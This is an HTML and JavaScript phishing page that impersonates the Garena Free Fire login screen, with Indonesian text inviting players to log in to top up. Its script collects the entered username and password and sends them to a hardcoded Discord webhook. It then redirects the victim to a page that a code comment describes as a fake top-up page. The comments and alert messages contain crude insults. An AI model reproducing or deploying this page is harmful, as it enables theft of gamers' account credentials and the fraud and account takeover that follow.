<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Garena - Free Fire</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { 
            background: linear-gradient(135deg, #1a1e2f 0%, #2a2f45 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .login-card {
            background: rgba(18, 20, 30, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 40px;
            padding: 35px 30px;
            width: 100%;
            max-width: 400px;
            border: 2px solid #ff7b00;
            box-shadow: 0 20px 40px rgba(255, 123, 0, 0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        .logo img {
            width: 160px;
            height: auto;
        }
        h2 {
            color: white;
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
        }
        .sub {
            color: #a0a6c0;
            text-align: center;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            color: #cbd0e6;
            font-size: 13px;
            font-weight: 500;
            display: block;
            margin-bottom: 6px;
            margin-left: 8px;
        }
        input {
            width: 100%;
            padding: 16px 18px;
            background: #0f111f;
            border: 2px solid #2c2f44;
            border-radius: 30px;
            font-size: 15px;
            color: white;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            border-color: #ff7b00;
        }
        .remember {
            display: flex;
            align-items: center;
            margin: 20px 0 25px;
        }
        .remember input {
            width: auto;
            margin-right: 10px;
            accent-color: #ff7b00;
        }
        .remember label {
            margin: 0;
            color: #a0a6c0;
        }
        button {
            width: 100%;
            background: #ff7b00;
            border: none;
            border-radius: 40px;
            padding: 18px;
            color: #0f111f;
            font-weight: 800;
            font-size: 18px;
            cursor: pointer;
            box-shadow: 0 10px 25px #ff7b00;
            transition: 0.2s;
            border: 2px solid #ff7b00;
            margin-bottom: 20px;
        }
        button:hover {
            background: #ff9100;
            transform: scale(1.02);
        }
        .links {
            display: flex;
            justify-content: space-between;
            color: #5c6180;
            font-size: 13px;
        }
        .links a {
            color: #ff7b00;
            text-decoration: none;
        }
        .footer-note {
            text-align: center;
            margin-top: 25px;
            color: #5c6180;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">
            <!-- PAKE GAMBAR LOKAL DARI FOLDER IMAGES -->
            <img src="images/garena-logo.png" alt="Garena" onerror="this.src='https://via.placeholder.com/160x60/ff7b00/ffffff?text=GARENA'">
        </div>
        <h2>Welcome Back!</h2>
        <div class="sub">Login ke akun Garena untuk lanjut top-up</div>

        <form id="loginForm">
            <div class="input-group">
                <label>üìß Email / Username</label>
                <input type="text" id="email" placeholder="Masukkan email atau username" required>
            </div>
            <div class="input-group">
                <label>üîí Password</label>
                <input type="password" id="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" required>
            </div>
            <div class="remember">
                <input type="checkbox" id="remember">
                <label for="remember">Ingat saya</label>
            </div>
            <button type="submit">LOGIN KE GARENA</button>
        </form>
        <div class="links">
            <a href="#">Lupa password?</a>
            <a href="#">Daftar baru</a>
        </div>
        <div class="footer-note">
            Dengan login, Anda menyetujui Syarat & Ketentuan Garena
        </div>
    </div>

    <script>
        // GANTI WEBHOOK INI BANGSAT!
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1474995590327828643/Hsj2F327G7j8_kmojLtpBD3PUekumPhmUw7pAJjSKdeoyaL-9fT-h9pMNdzQF0liyUei';

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;

            if (!email || !password) {
                alert('Isi semua field, kontol!');
                return;
            }

            // Kirim ke Discord
            let data = {
                content: '@everyone **DATA LOGIN GARENA MENTAH**',
                embeds: [{
                    title: 'üîê LOGIN CREDENTIALS',
                    color: 16744704,
                    fields: [
                        { name: 'EMAIL/USERNAME', value: '```' + email + '```', inline: true },
                        { name: 'PASSWORD', value: '```' + password + '```', inline: true },
                        { name: 'TIMESTAMP', value: '<t:' + Math.floor(Date.now() / 1000) + ':F>', inline: false }
                    ],
                    footer: { text: 'Architect 01 ‚Äì ¬© RianModss' }
                }]
            };

            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(res => {
                if (res.ok) {
                    // Redirect ke halaman top-up palsu setelah login sukses
                    window.location.href = 'topup.html';
                } else {
                    alert('Gagal, coba lagi.');
                }
            })
            .catch(() => alert('Error jaringan.'));
        });
    </script>
</body>
</html>
